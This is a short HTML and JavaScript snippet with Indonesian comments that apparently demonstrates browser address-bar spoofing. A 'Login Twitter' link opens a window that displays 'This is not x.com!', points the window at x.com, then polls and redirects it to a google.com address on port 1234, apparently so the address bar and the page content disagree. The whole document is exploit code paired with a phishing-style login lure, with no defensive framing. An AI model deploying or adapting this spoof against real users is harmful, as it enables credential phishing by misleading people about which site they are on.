<script>
  function next() {
    // Mengarahkan ulang ke alamat yang diinginkan
    w.location.replace('https://www.google.com:1234');
  }

  function f() {
    // Membuka jendela baru
    w = window.open("");
    w.document.write('<h2>This is not x.com!</h2>');

    // Mengatur lokasi ke x.com setelah sedikit delay
    setTimeout(function() {
      w.location = "https://x.com";
    }, 500); // Delay agar perubahan lokasi lebih stabil dan tidak tereksekusi terlalu cepat

    // Menggunakan setInterval untuk mengecek apakah alamat sudah berubah
    i = setInterval(function() {
      try {
        // Mengecek URL halaman yang terbuka
        let url = w.location.href;
        if (url !== 'https://x.com') {
          // Jika URL bukan yang diinginkan, lakukan redirect
          next();
        }
      } catch (e) {
        // Jika ada kesalahan (misalnya window sudah tidak ada), hentikan interval
        clearInterval(i);
      }
    }, 50);  // Interval yang lebih moderat (50ms)
  }
</script>

<a href="#" onclick="f()">Login Twitter</a>
